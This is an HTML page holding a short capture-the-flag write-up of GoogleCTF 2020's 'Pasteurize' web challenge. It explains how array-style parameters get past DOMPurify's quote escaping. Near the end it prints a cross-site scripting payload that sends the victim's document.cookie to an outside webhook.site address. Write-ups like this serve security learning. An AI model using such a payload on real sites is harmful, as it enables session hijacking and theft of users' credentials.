@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Jamie Polintan ">
+<meta name="description" content="This is the first challenge I worked on. I will soon upload a post on the second one. (As GoogleCTF 2020 ended on the day of this post, I will be omitting the flag from this article. I will update it once enough time has passed.)
+Let&amp;rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function.
+When you make a note, you have an option to share it with a &amp;ldquo;TjMike&amp;rdquo; Entity." />
+<meta name="keywords" content=", writeup, web, xss" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/" />
+
+
+    <title>
+        
+            GoogleCTF 2020: Pasteurize :: Jam Polintan 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://jamvie.net/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://jamvie.net/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://jamvie.net/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://jamvie.net/favicon-16x16.png">
+    <link rel="manifest" href="https://jamvie.net/site.webmanifest">
+    <link rel="mask-icon" href="https://jamvie.net/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://jamvie.net/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="GoogleCTF 2020: Pasteurize">
+<meta itemprop="description" content="This is the first challenge I worked on. I will soon upload a post on the second one. (As GoogleCTF 2020 ended on the day of this post, I will be omitting the flag from this article. I will update it once enough time has passed.)
+Let&rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function.
+When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo; Entity.">
+<meta itemprop="datePublished" content="2020-08-23T17:35:14-06:00" />
+<meta itemprop="dateModified" content="2020-08-23T17:35:14-06:00" />
+<meta itemprop="wordCount" content="366">
+<meta itemprop="image" content="https://jamvie.net/img/profile.jpg"/>
+
+
+
+<meta itemprop="keywords" content="writeup,web,xss," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://jamvie.net/img/profile.jpg"/>
+
+<meta name="twitter:title" content="GoogleCTF 2020: Pasteurize"/>
+<meta name="twitter:description" content="This is the first challenge I worked on. I will soon upload a post on the second one. (As GoogleCTF 2020 ended on the day of this post, I will be omitting the flag from this article. I will update it once enough time has passed.)
+Let&rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function.
+When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo; Entity."/>
+
+
+
+    <meta property="og:title" content="GoogleCTF 2020: Pasteurize" />
+<meta property="og:description" content="This is the first challenge I worked on. I will soon upload a post on the second one. (As GoogleCTF 2020 ended on the day of this post, I will be omitting the flag from this article. I will update it once enough time has passed.)
+Let&rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function.
+When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo; Entity." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/" />
+<meta property="og:image" content="https://jamvie.net/img/profile.jpg"/>
+<meta property="article:published_time" content="2020-08-23T17:35:14-06:00" />
+<meta property="article:modified_time" content="2020-08-23T17:35:14-06:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-23 17:35:14 -0600 MDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://jamvie.net/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ echo &#39;hello&#39;</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://jamvie.net/about/">About Me</a></li><li><a href="https://jamvie.net/tags/">Categories</a></li><li><a href="https://jamvie.net/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>2 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/">GoogleCTF 2020: Pasteurize</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <p>This is the first challenge I worked on. I will soon upload a post on the second one. (As GoogleCTF 2020 ended on the day of this post, I will be omitting the flag from this article. I will update it once enough time has passed.)</p>
+<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
+<p>The challenge lets us load into the DOM whatever we want through this pastebin-esque function.</p>
+<p>When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo; Entity. Sign of XSS/CSRF attacks?</p>
+<p>Looking into the source, whatever content we put into the note is immediately shoved into a javascript string. However, if you try to input quotation marks in there, the DOMpurify clean function escapes it. So, if we can get an unescaped quote in there, we can do whatever want. Let&rsquo;s focus on the comment.</p>
+<p>Going to the <code>/source</code> endpoint takes us, well, directly to the webpage&rsquo;s app file.</p>
+<p>Of note are the app&rsquo;s use of using the Express BodyParser to operate on &lsquo;extended&rsquo; mode (using the <code>qs</code> library instead of the <code>querystring</code> library).</p>
+
+    <img src="https://jamvie.net/images/Google2020bodyparser.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>In the source we also see:</p>
+
+    <img src="https://jamvie.net/images/google2020json.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><code>JSON.stringify(unsafe)</code> - if our content (unsafe) is a string, then the function simply adds additional quotation marks onto the string, and the <code>slice(1,-1)</code> function removes those extra quotations, before feeding it to the DOM to be rendered. What if our input isn&rsquo;t a string - what if it&rsquo;s an array?</p>
+<p>The <a href="https://www.npmjs.com/package/qs#parsing-arrays"><code>qs</code></a> library allows arrays to be parsed from HTTP requests if theyre stipulated as:</p>
+<pre><code>{
+    array[]=a&amp;array[]=b
+
+    //array = [a,b]
+}
+</code></pre><p>When we make a note (POST request to <code>/note</code>), intercept the request via burpsuite. Modify your query there. Change <code>content=</code> to <code>content[]=</code> (Alternatively, you can CURL your request to not deal with proxy settings).</p>
+
+    <img src="https://jamvie.net/images/google2020pastalert.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+
+    <img src="https://jamvie.net/images/google2020xss.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>If we go to the page, we see that an alert is prompted - aka, we have succesfully escaped the JS string and can write javascript code as normal. That being said, let&rsquo;s go ahead and craft a payload to xss TJMike (I am being lazy and reusing an old payload of mine from before and modifying it).</p>
+<pre><code>content[]=; document.getElementById('note-content').onLoad = fetch('https://webhook.site/64627794-30a4-466d-b93a-537bdebca744', {method:'POST', body:JSON.stringify({data:document.cookie})});const uwu = 
+</code></pre><p>Share our note to TJMike. Wait for our server to grab their cookie.</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://jamvie.net/tags/writeup">writeup</a></span><span class="tag"><a href="https://jamvie.net/tags/web">web</a></span><span class="tag"><a href="https://jamvie.net/tags/xss">xss</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>366 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-08-23 17:35 -0600</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://jamvie.net/posts/2020/08/hacktivitycon-ctf-bullseye/">
+                                <span class="button__text">HacktivityCon CTF: Bullseye</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="https://jamvie.net">Jamie Polintan</a></span>
+            
+            <span>CC Attribution-NonCommercial 4.0 International License</span>
+            <span> <a href="https://jamvie.net/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://jamvie.net/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
